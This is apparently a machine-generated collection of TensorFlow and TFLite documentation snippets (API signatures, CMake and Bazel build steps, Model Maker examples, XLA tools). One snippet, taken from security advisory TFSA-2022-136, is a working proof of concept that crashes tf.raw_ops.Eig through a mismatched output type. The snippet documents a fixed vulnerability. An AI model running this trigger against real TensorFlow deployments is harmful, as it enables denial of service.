%outputs_67, %control_68 = tf_executor.island wraps "tf.PartitionedCall"(%arg0, %outputs_0) {_collective_manager_ids = [], _read_only_resource_inputs = [], _xla_compile_device_type = "", config = "", config_proto = "\0A\07\0A\03CPU\10\01\0A\07\0A\03GPU\10\00\0A\07\0A\03TPU\10\02\0A\0E\0A\0ATPU_SYSTEM\10\012\02J\008\01\82\01\05h\01\88\01\01", device = "", executor_type = "", f = @__inference__jit_compiled_convolution_op_1510} : (tensor<4x32x32x8xf32>, tensor<*xf32>) -> tensor<*xf32>

```

----------------------------------------

TITLE: Initializing ImagePropertiesT from Buffer in Python
DESCRIPTION: This class method deserializes an `ImagePropertiesT` object from a byte buffer (`buf`) starting at a specific position (`pos`). It is typically used to load metadata from a FlatBuffers binary representation. The method expects the buffer to contain the serialized data for the image properties object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ImagePropertiesT.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
InitFromBuf(
    buf, pos
)
```

----------------------------------------

TITLE: Evaluating TFLite Question Answer Model in Python
DESCRIPTION: Evaluates a TFLite version of the Question Answer model given its file path. Similar to `evaluate`, it computes Exact Match and F1 scores and supports parameters for answer length, null score threshold, logging, and saving outputs to a directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/QuestionAnswer.md#_snippet_5

LANGUAGE: python
CODE:
```
evaluate_tflite(
    tflite_filepath,
    data,
    max_answer_length=30,
    null_score_diff_threshold=0.0,
    verbose_logging=False,
    output_dir=None
)
```

----------------------------------------

TITLE: Conditional Installation Block
DESCRIPTION: This `if` block checks if the CMake variable `TFLITE_ENABLE_INSTALL` is set (likely as a cache variable or option). The commands within this block will only be executed if `TFLITE_ENABLE_INSTALL` evaluates to true, controlling whether the library is installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/cmake/modules/ml_dtypes/CMakeLists.txt#_snippet_7

LANGUAGE: CMake
CODE:
```
if(TFLITE_ENABLE_INSTALL)
  install(
    TARGETS ml_dtypes
    EXPORT tensorflow-liteTargets
    LIBRARY DESTINATION ${CMAKE_INSTALL_LIBDIR}
    ARCHIVE DESTINATION ${CMAKE_INSTALL_LIBDIR}
    PUBLIC_HEADER DESTINATION ${CMAKE_INSTALL_INCLUDEDIR}
  )
endif()
```

----------------------------------------

TITLE: Defining BertQuestionAnswerer Listener Interface in Android (Kotlin)
DESCRIPTION: This Kotlin interface defines the contract for handling the results and errors from the BertQuestionAnswerer. It includes methods to handle errors and to receive a list of potential answers along with the inference time.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/question_answer.md#_snippet_10

LANGUAGE: kotlin
CODE:
```
interface AnswererListener {
    fun onError(error: String)
    fun onResults(
        results: List<QaAnswer>?,
        inferenceTime: Long
    )
}
```

----------------------------------------

TITLE: Exporting TFLite Model (Default) - Python
DESCRIPTION: Exports the trained model to TensorFlow Lite format in the specified directory using the default settings, including embedding metadata and applying dynamic range quantization if applicable. This is the standard way to convert the model for on-device use.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/question_answer.ipynb#_snippet_10

LANGUAGE: python
CODE:
```
model.export(export_dir='.')
```

----------------------------------------

TITLE: Adding Associated File Name in TFLite Metadata (Python)
DESCRIPTION: This function is used to add a name string to an associated file within a TFLite metadata schema builder. It requires a builder object and the name string to be added. This function is typically called during the process of constructing or modifying the metadata for a TensorFlow Lite model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AssociatedFileAddName.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.AssociatedFileAddName(
    builder, name
)
```

----------------------------------------

TITLE: Setting Target Properties (Public Headers)
DESCRIPTION: This command sets properties for the `ml_dtypes` target. Specifically, it sets the `PUBLIC_HEADER` property to the list of files found by the `file(GLOB)` command. This property is often used by installation or packaging commands to know which headers should be installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/cmake/modules/ml_dtypes/CMakeLists.txt#_snippet_6

LANGUAGE: CMake
CODE:
```
set_target_properties(ml_dtypes PROPERTIES
  PUBLIC_HEADER "${ML_DTYPES_PUBLIC_HEADERS}")
```

----------------------------------------

TITLE: Demonstrating TensorFlow Eig Vulnerability - Python
DESCRIPTION: This Python snippet demonstrates how the TensorFlow `tf.raw_ops.Eig` vulnerability (TFSA-2022-136) can be triggered. It sets up inputs for the `Eig` operation, specifically providing `tf.complex128` for the `Tout` parameter when it's not expected for the input type, aiming to cause a `CHECK` fail and potential denial of service. Requires TensorFlow and NumPy.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-136.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
import numpy as np 
arg_0=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)
arg_1=tf.complex128
arg_2=True
arg_3=''
tf.raw_ops.Eig(input=arg_0, Tout=arg_1, compute_v=arg_2, name=arg_3)
```

----------------------------------------

TITLE: Inspecting Source Code of Transformed Function
DESCRIPTION: Uses the standard library's `inspect` module to retrieve and print the source code of the function `new_f` generated by the `HelloTranspiler`. This allows verifying the AST modifications performed by the transpiler, showing the added print statement.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/pyct_tutorial.ipynb#_snippet_11

LANGUAGE: python
CODE:
```
import inspect

print(inspect.getsource(new_f))
```

----------------------------------------

TITLE: Disable TFLite Platform Tracing via ADB Shell
DESCRIPTION: This command disables TensorFlow Lite's platform tracing feature on the Android device by setting the system property 'debug.tflite.trace' back to 0 using 'adb shell setprop'. This should be done after collecting the desired trace data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/android/README.md#_snippet_10

LANGUAGE: Shell
CODE:
```
adb shell setprop debug.tflite.trace 0
```

----------------------------------------

TITLE: Running the Wheel Build Script
DESCRIPTION: This command executes the `wheel.sh` script located in the `ci/official` directory. This script is typically used to build the TensorFlow Python wheel package. It should be run after the `TFCI` environment variable has been set using one of the `export` commands shown previously.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/ci/official/README.md#_snippet_4

LANGUAGE: bash
CODE:
```
ci/official/wheel.sh
```

----------------------------------------

TITLE: Initializing SentencePieceTokenizerOptionsT Python Class
DESCRIPTION: This snippet shows the default constructor for the `SentencePieceTokenizerOptionsT` class in Python. It is used to create a new, empty instance of the class before populating its fields or initializing it from external data. It does not require any arguments during instantiation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SentencePieceTokenizerOptionsT.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.SentencePieceTokenizerOptionsT()
```

----------------------------------------

TITLE: Adding Associated Files Metadata using FlatBuffer Builder (Python)
DESCRIPTION: This function adds associated files metadata to a tensor metadata object using a FlatBuffer builder. It is typically used during the process of generating metadata for TensorFlow Lite models. It requires a FlatBuffer builder instance and the data representing the associated files.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadataAddAssociatedFiles.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.TensorMetadataAddAssociatedFiles(
    builder, associatedFiles
)
```

----------------------------------------

TITLE: Evaluating TFLite Recommendation Model - TensorFlow Model Maker Python
DESCRIPTION: This method specifically evaluates a model that has been converted to the TFLite format. It requires the path to the TFLite model file and the evaluation data. The data is padded internally, and multiple metrics are evaluated, returning a dictionary of results.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/recommendation/Recommendation.md#_snippet_5

LANGUAGE: Python
CODE:
```
evaluate_tflite(
    tflite_filepath, data
)
```

----------------------------------------

TITLE: Adding Input Tensor Metadata to SubGraph - TFLite Python
DESCRIPTION: This Python function is a helper generated from the TFLite metadata schema. It facilitates the process of adding a reference to input tensor metadata within the definition of a subgraph's metadata using a FlatBuffer builder. It requires the builder object and the offset/index of the input tensor metadata to be linked.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadataAddInputTensorMetadata.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.SubGraphMetadataAddInputTensorMetadata(
    builder, inputTensorMetadata
)
```

----------------------------------------

TITLE: Downloading TFLite Embedder Model (Bash)
DESCRIPTION: This command downloads the pre-trained TFLite Universal Sentence Encoder model file. This specific TFLite model is used as the embedder within the TextDataLoader to convert text strings into numerical feature vectors.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_searcher.ipynb#_snippet_3

LANGUAGE: bash
CODE:
```
!wget -O universal_sentence_encoder.tflite https://storage.googleapis.com/download.tensorflow.org/models/tflite_support/searcher/text_to_image_blogpost/text_embedder.tflite
```

----------------------------------------

TITLE: Initialize and Run Inference with TFLBertQuestionAnswerer (Swift)
DESCRIPTION: This Swift snippet shows how to initialize the `TFLBertQuestionAnswerer` by providing the path to the TFLite model and then perform question answering inference by passing the context passage and the question.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/bert_question_answerer.md#_snippet_3

LANGUAGE: swift
CODE:
```
// Initialization
let mobileBertAnswerer = TFLBertQuestionAnswerer.questionAnswerer(
      modelPath: mobileBertModelPath)

// Run inference
let answers = mobileBertAnswerer.answer(
      context: context, question: question)
```

----------------------------------------

TITLE: Importing Libraries for TFLite Quantization Python
DESCRIPTION: Imports necessary Python libraries for building, training, converting, and running TensorFlow Lite models, including logging for debugging, TensorFlow/Keras for model definition and training, NumPy for data handling, and pathlib for file system operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant_16x8.ipynb#_snippet_0

LANGUAGE: python
CODE:
```
import logging
logging.getLogger("tensorflow").setLevel(logging.DEBUG)

import tensorflow as tf
from tensorflow import keras
import numpy as np
import pathlib
```

----------------------------------------

TITLE: Running a Specific Bazel Test Target - Bash
DESCRIPTION: Executes a single, specific Bazel test target identified by its full label (e.g., `tensorflow/python/kernel_tests/nn_ops:softmax_op_test`). It uses the previously defined `flags` environment variable. This command is ideal for quickly rerunning or debugging a particular test case.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/CONTRIBUTING.md#_snippet_11

LANGUAGE: bash
CODE:
```
bazel test ${flags} tensorflow/python/kernel_tests/nn_ops:softmax_op_test
```

----------------------------------------

TITLE: Creating and Training Model with Custom Spec - TensorFlow Lite Model Maker - Python
DESCRIPTION: Creates and trains a new model using the `text_classifier.create` function. It utilizes the provided training data and the customized model specification object, applying default training parameters like epochs and batch size defined in the spec.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_25

LANGUAGE: python
CODE:
```
model = text_classifier.create(new_train_data, model_spec=new_model_spec)
```

----------------------------------------

TITLE: Running NLClassifier Inference Python
DESCRIPTION: Imports the necessary NLClassifier class, initializes it from a model file path, and then demonstrates how to call the classify method on an input text string to get the classification result object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/nl_classifier.md#_snippet_6

LANGUAGE: Python
CODE:
```
# Imports
from tflite_support.task import text

# Initialization
classifier = text.NLClassifier.create_from_file(model_path);

# Run inference
text_classification_result = classifier.classify(text);
```

----------------------------------------

TITLE: Installing FFTSG2D Library CMake
DESCRIPTION: Configures installation rules for the `fft2d_fftsg2d` target. Similar to the `fftsg` target, the library and archive components will be installed to the standard library directory, and public headers to the standard include directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/cmake/modules/fft2d/CMakeLists.txt#_snippet_10

LANGUAGE: CMake
CODE:
```
install(
  TARGETS fft2d_fftsg2d
  EXPORT tensorflow-liteTargets
  LIBRARY DESTINATION ${CMAKE_INSTALL_LIBDIR}
  ARCHIVE DESTINATION ${CMAKE_INSTALL_LIBDIR}
  PUBLIC_HEADER DESTINATION ${CMAKE_INSTALL_INCLUDEDIR}
)
```

----------------------------------------

TITLE: Calling tf.function with Python Value (Python)
DESCRIPTION: This snippet executes the `tf.function f` defined previously, providing a Python integer `1` as input. This shows that when a standard Python value is printed using `print` within a `tf.function`, its actual value is printed directly during graph construction.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/debugging.md#_snippet_5

LANGUAGE: python
CODE:
```
f(1)
```

----------------------------------------

TITLE: Add First Layers to Suspected List Python
DESCRIPTION: Appends the `tensor_name` values of the first five layers in the `layer_stats` DataFrame to the `suspected_layers` list. This is based on the heuristic that skipping quantization for initial layers can sometimes improve model quality.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/quantization_debugger.ipynb#_snippet_15

LANGUAGE: Python
CODE:
```
suspected_layers.extend(list(layer_stats[:5]['tensor_name']))
```

----------------------------------------

TITLE: Building Inference Diff Tool Android Bazel
DESCRIPTION: This command builds the TensorFlow Lite Inference Diff tool specifically for the Android ARM64 architecture using Bazel. It compiles the necessary source files with optimizations enabled (`-c opt`) and targets the specified run_eval binary.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/evaluation/tasks/inference_diff/README.md#_snippet_0

LANGUAGE: bazel
CODE:
```
bazel build -c opt \
  --config=android_arm64 \
  //tensorflow/lite/tools/evaluation/tasks/inference_diff:run_eval
```

----------------------------------------

TITLE: Exporting Object Detector Model Python
DESCRIPTION: This method converts and exports the trained model into various formats like TFLite, SavedModel, labels, or vocabulary files based on the specified export directory and format list.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/object_detector/ObjectDetector.md#_snippet_6

LANGUAGE: python
CODE:
```
export(
    export_dir,
    tflite_filename='model.tflite',
    label_filename='labels.txt',
    vocab_filename='vocab.txt',
    saved_model_filename='saved_model',
    tfjs_folder_name='tfjs',
    export_format=None,
    **kwargs
)
```

----------------------------------------

TITLE: Calling Evaluation Function for Float and Quantized Models Python
DESCRIPTION: These lines call the `evaluate_model` helper function to calculate and print the overall accuracy of the float and quantized TensorFlow Lite models on the entire test dataset. This provides a quantitative comparison of the models' performance.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant.ipynb#_snippet_14

LANGUAGE: Python
CODE:
```
evaluate_model(tflite_model_file, model_type="Float")
```

LANGUAGE: Python
CODE:
```
evaluate_model(tflite_model_quant_file, model_type="Quantized")
```

----------------------------------------

TITLE: Iterating Dataset with Break in AutoGraph for loop Python
DESCRIPTION: Shows how AutoGraph handles a `for` loop over a `tf.data.Dataset` that includes a `break` statement. It converts this construct into a combination of `tf.data.Dataset.scan`, `tf.data.Dataset.take_while`, and `tf.data.Dataset.reduce` operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_24

LANGUAGE: Python
CODE:
```
for i in tf.data.Dataset.range(3):
  tf.print('iteration:', i)
  break
```

----------------------------------------

TITLE: Creating Model with YamNetSpec [Python]
DESCRIPTION: Creates a classification model based on the YamNetSpec. It requires the number of output classes and optionally allows specifying whether to train the entire model (transfer learning on base YAMNet) or just the newly added classification head.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/YamNetSpec.md#_snippet_1

LANGUAGE: python
CODE:
```
create_model(
    num_classes, train_whole_model=False
)
```

----------------------------------------

TITLE: Adding Dependency to Overall Check Target (CMake)
DESCRIPTION: Adds a dependency such that the 'check-mlir-hlo-lit' target is built and run as part of the main 'check-mlir-hlo' target. This integrates the LIT regression tests into the standard 'check' build process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/tests/CMakeLists.txt#_snippet_6

LANGUAGE: CMake
CODE:
```
add_dependencies(check-mlir-hlo check-mlir-hlo-lit)
```

----------------------------------------

TITLE: Initializing TensorImage object (Python)
DESCRIPTION: Initializes a TensorImage object using raw image data provided as an `image_utils.ImageData` instance. It takes a boolean flag to indicate if the data originated from a NumPy array or was loaded from C++, which affects memory management.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/TensorImage.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.task.vision.TensorImage(
    image_data: image_utils.ImageData, is_from_numpy_array: bool = True
) -> None
```

----------------------------------------

TITLE: Converting a tf.keras HDF5 Model to TFLite
DESCRIPTION: This command shows how to convert a TensorFlow Keras model saved in the HDF5 (.h5) format to a TensorFlow Lite model. It requires providing the path to the input Keras model file and the path for the output TFLite file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/r1/convert/cmdline_examples.md#_snippet_2

LANGUAGE: Shell
CODE:
```
tflite_convert \
  --keras_model_file=/tmp/keras_model.h5 \
  --output_file=/tmp/foo.tflite
```

----------------------------------------

TITLE: Run Docker Container for TF Lite Android Build
DESCRIPTION: Start an interactive Docker container based on the 'tflite-builder' image. It mounts the current host directory ('$PWD' or 'pwd' on Windows PowerShell) to '/host_dir' inside the container, allowing file sharing between host and container.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/lite_build.md#_snippet_3

LANGUAGE: shell
CODE:
```
docker run -it -v $PWD:/host_dir tflite-builder bash
```

----------------------------------------

TITLE: Use Standard TFLite C API Functions
DESCRIPTION: Illustrates the basic usage of standard TensorFlow Lite C API functions to create a model, interpreter options, and an interpreter instance within your native C/C++ code using pointers returned by the API.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/native.md#_snippet_8

LANGUAGE: C++
CODE:
```
auto model = TfLiteModelCreate(model_asset, model_asset_length);
// ...
auto options = TfLiteInterpreterOptionsCreate();
// ...
auto interpreter = TfLiteInterpreterCreate(model, options);
```

----------------------------------------

TITLE: Adding TensorFlow Lite Task Vision Dependency via CocoaPods
DESCRIPTION: Adds the TensorFlowLiteTaskVision pod dependency to an iOS project's Podfile. This is the standard way to include the Task Library for vision tasks like image classification in an iOS application using CocoaPods.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/image_classifier.md#_snippet_2

LANGUAGE: Ruby
CODE:
```
target 'MyAppWithTaskAPI' do
  use_frameworks!
  pod 'TensorFlowLiteTaskVision'
end
```

----------------------------------------

TITLE: Training Model with Custom Hyperparameters - Python
DESCRIPTION: Creates and trains the question answering model using the specified training data, model specification, and custom training hyperparameters like epochs and batch size. This demonstrates tuning the training process for potentially better performance.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/question_answer.ipynb#_snippet_14

LANGUAGE: python
CODE:
```
model = question_answer.create(train_data, model_spec=spec, epochs=5, batch_size=64)
```

----------------------------------------

TITLE: Import & Initialize TFLite Interpreter (Python)
DESCRIPTION: Demonstrates how to use the TensorFlow Lite Interpreter after installing the `tflite_runtime` package. It shows importing the `Interpreter` class and creating an instance by providing the file path to a TensorFlow Lite model (`.tflite`).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/pip_package/README.md#_snippet_16

LANGUAGE: python
CODE:
```
from tflite_runtime.interpreter import Interpreter
interpreter = Interpreter(model_path="foo.tflite")
```

----------------------------------------

TITLE: Run an hlo-opt Pass with XLA Flags
DESCRIPTION: This command applies a specific HLO pass using `hlo-opt` and also sets XLA debug options via `XLA_FLAGS` syntax on the command line, allowing fine-grained control over pass behavior.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools.md#_snippet_15

LANGUAGE: Command Line
CODE:
```
hlo-opt --passes=schedule-aware-collective-cse
--xla_gpu_experimental_collective_cse_distance_threshold=20 input.hlo
```

----------------------------------------

TITLE: Checking Compiler Builtin Feature with CMake
DESCRIPTION: Uses CMake's `check_cxx_source_compiles` to test if the C++ compiler supports `__builtin_expect` by compiling a small test snippet. This result is stored in the `FARMHASH_HAS_BUILTIN_EXPECT` variable.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/cmake/modules/farmhash/CMakeLists.txt#_snippet_1

LANGUAGE: CMake
CODE:
```
include(CheckCXXSourceCompiles)
check_cxx_source_compiles(
  "int main(int argc, char* argv[]) { return (int)__builtin_expect(0, 0); }"
  FARMHASH_HAS_BUILTIN_EXPECT
)
```

----------------------------------------

TITLE: Building TensorFlow Lite C++ Library 32bit (Shell)
DESCRIPTION: This shell command demonstrates how to build the 32bit `libtensorflowlite.so` shared library for the `armeabi-v7a` Android ABI using Bazel. This is for developers using the Android NDK to integrate TFLite via its C++ API.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/development.md#_snippet_4

LANGUAGE: Shell
CODE:
```
bazel build -c opt --config=android_arm //tensorflow/lite:libtensorflowlite.so
```

----------------------------------------

TITLE: Evaluating Model Simple Example Python
DESCRIPTION: Evaluates the trained image classifier model using the test data. It calculates and returns the loss and accuracy metrics for the model's performance on unseen data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/image_classification.ipynb#_snippet_5

LANGUAGE: python
CODE:
```
loss, accuracy = model.evaluate(test_data)
```

----------------------------------------

TITLE: Checking Minimum Parser Version (Java)
DESCRIPTION: This Java method of the `MetadataExtractor` class allows verifying if the version of the metadata parser in use is compatible with the minimum required version specified in the model's metadata. This ensures that the parser can fully read the metadata Flatbuffers data. Requires an initialized `MetadataExtractor` object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata.md#_snippet_11

LANGUAGE: java
CODE:
```
public final boolean isMinimumParserVersionSatisfied();
```

----------------------------------------

TITLE: Defining Protobuf Messages for Splitting
DESCRIPTION: Defines the `ActivationFunction`, `Layer`, and `ModelConfig` protobuf messages used as examples throughout the document to demonstrate the concepts of splitting and merging.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/proto_splitter/g3doc/in-depth-guide.md#_snippet_1

LANGUAGE: proto
CODE:
```
enum ActivationFunction {
  RELU = 0;
  SIGMOID = 1;
  TANH = 2;
}

message Layer {
  string name = 1;
  int32 num_units = 2;
  ActivationFunction activation_function = 3;
}

message ModelConfig {
  string model_name = 1;
  int32 input_shape = 2;
  repeated Layer hidden_layers = 3;
  int32 output_units = 4;
  ActivationFunction output_activation = 5;
  map<string, float> hyperparameters = 6;
}
```

----------------------------------------

TITLE: CoreMLDelegate Swift Class and Options Definition (Swift)
DESCRIPTION: Defines the public structure of the experimental CoreMLDelegate class and its nested Options struct in Swift. It shows how the Swift class wraps the underlying C API for delegate creation and deletion.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/coreml/README.md#_snippet_4

LANGUAGE: Swift
CODE:
```
/// A delegate that uses the `Core ML` framework for performing
/// TensorFlow Lite graph operations.
///
/// - Important: This is an experimental interface that is subject to change.
public final class CoreMLDelegate: Delegate {
 /// The configuration options for the `CoreMLDelegate`.
 public let options: Options

 // Conformance to the `Delegate` protocol.
 public private(set) var cDelegate: CDelegate

 * /// Creates a new instance configured with the given `options`.
 ///
 /// - Parameters:
 ///   - options: Configurations for the delegate. The default is a new instance of
 ///       `CoreMLDelegate.Options` with the default configuration values.
 public init(options: Options = Options()) {
   self.options = options
   var delegateOptions = TfLiteCoreMlDelegateOptions()
   cDelegate = TfLiteCoreMlDelegateCreate(&delegateOptions)
 }

 deinit {
   TfLiteCoreMlDelegateDelete(cDelegate)}
}

extension CoreMLDelegate {
 /// Options for configuring the `CoreMLDelegate`.
 public struct Options: Equatable, Hashable {
   /// Creates a new instance with the default values.
   public init() {}
 }
}
```

----------------------------------------

TITLE: Handling Cross-Compilation and Host Tools
DESCRIPTION: This block checks if CMake is performing a cross-compilation. If so, it requires the user to specify a directory containing host tools (`TFLITE_HOST_TOOLS_DIR`), specifically looking for the `flatc` compiler needed to run on the build host.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_6

LANGUAGE: CMake
CODE:
```
if(${CMAKE_CROSSCOMPILING})
  set(TFLITE_HOST_TOOLS_DIR "" CACHE PATH "Host tools directory")
  if(TFLITE_HOST_TOOLS_DIR STREQUAL "")
    message(FATAL_ERROR "When cross-compiling, some tools need to be available to run on the host (current required tools: flatc). Please specify where those binaries can be found by using -DTFLITE_HOST_TOOLS_DIR=<flatc_dir_path>.")
  endif()

  # Setup the host FlatBuffers compiler.
  set(FLATC_PATHS
      ${TFLITE_HOST_TOOLS_DIR}
      ${TFLITE_HOST_TOOLS_DIR}/bin
      ${TFLITE_HOST_TOOLS_DIR}/flatbuffers-flatc/bin
      )
  find_program(FLATC_BIN flatc PATHS ${FLATC_PATHS})
  if(${FLATC_BIN} STREQUAL "FLATC_BIN-NOTFOUND")
    message(FATAL_ERROR "Host 'flatc' compiler has not been found in the following locations: ${FLATC_PATHS}")
  else()
    message(STATUS "Pre-built 'flatc' compiler for cross-compilation purposes found: ${FLATC_BIN}")
    set(FLATBUFFERS_FLATC_EXECUTABLE "${FLATC_BIN}")
  endif()
else()
  set(FLATBUFFERS_FLATC_EXECUTABLE "${CMAKE_BINARY_DIR}/flatbuffers-flatc/bin/flatc")
  set(FLATC_TARGET "flatbuffers-flatc")
endif()
```

----------------------------------------

TITLE: Setting MLIR TableGen Target Definition - CMake
DESCRIPTION: Sets the CMake variable `LLVM_TARGET_DEFINITIONS` to specify the input TableGen definition file used by subsequent `mlir_tablegen` calls. This variable typically points to a `.td` file that defines MLIR operations, types, or passes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/transforms/CMakeLists.txt#_snippet_0

LANGUAGE: CMake
CODE:
```
set(LLVM_TARGET_DEFINITIONS passes.td)
```

----------------------------------------

TITLE: Register Custom Operator with MutableOpResolver C++
DESCRIPTION: Shows how to use `MutableOpResolver` in C++ to register both built-in and custom operators. It first adds all built-in operators using `AddAll` and then registers a custom operator (e.g., `AtanOpRegistration`) using `AddOp`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_custom.md#_snippet_18

LANGUAGE: C++
CODE:
```
tflite::ops::builtin::MutableOpResolver resolver;
resolver.AddAll(tflite::ops::builtin::BuiltinOpResolver());
tflite::AddOp(&resolver, AtanOpRegistration());
```

----------------------------------------

TITLE: Executing PjRtLoadedExecutable C++
DESCRIPTION: These C++ methods on `PjRtLoadedExecutable` are the primary interfaces for running a compiled computation on PJRT devices. They take vectors of `PjRtBuffer` objects as input arguments and return vectors of `PjRtBuffer` results. Different versions are provided to handle execution on addressable devices (`Execute`), a specific device for a sharded replica (`ExecuteSharded`), or a single device for a single replica/partition (`ExecutePortable`). The framework provides pre-allocated buffers as inputs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/pjrt/cpp_api_overview.md#_snippet_1

LANGUAGE: C++
CODE:
```
absl::StatusOr<std::vector<std::vector<std::unique_ptr<PjRtBuffer>>>>
Execute(absl::Span<const std::vector<PjRtBuffer*>> argument_handles, ...) {...}
```

LANGUAGE: C++
CODE:
```
absl::StatusOr<std::vector<std::unique_ptr<PjRtBuffer>>>
ExecuteSharded(absl::Span<PjRtBuffer* const> argument_handles,
              PjRtDevice* device, ...) {...}
```

LANGUAGE: C++
CODE:
```
absl::StatusOr<std::vector<std::unique_ptr<PjRtBuffer>>>
ExecutePortable(absl::Span<PjRtBuffer* const> argument_handles,
                PjRtDevice* device, ...) {...}
```

----------------------------------------

TITLE: Building XLA for CPU in Docker (Shell)
DESCRIPTION: Executes the configuration script for the CPU backend and then builds the XLA project using Bazel inside the running 'xla' Docker container. This compiles XLA specifically for CPU targets within the isolated environment.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/developer_guide.md#_snippet_3

LANGUAGE: sh
CODE:
```
docker exec xla ./configure.py --backend=CPU
docker exec xla bazel build --test_output=all --spawn_strategy=sandboxed //xla/...
```

----------------------------------------

TITLE: Add Metadata for Image Segmenter (Partial, Python)
DESCRIPTION: This partial snippet begins the process of adding metadata for a TFLite image segmentation model. It defines the necessary file paths for the model and labels and initializes the `ImageSegmenterWriter` class.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata_writer_tutorial.ipynb#_snippet_10

LANGUAGE: python
CODE:
```
ImageSegmenterWriter = image_segmenter.MetadataWriter
_MODEL_PATH = "deeplabv3.tflite"
```

----------------------------------------

TITLE: Converting Examples to TFRecord Features in AverageWordVecSpec
DESCRIPTION: Converts input examples into a feature format suitable for model training and saves them to a specified TFRecord file. Requires examples, the output file path, and a list of label names.
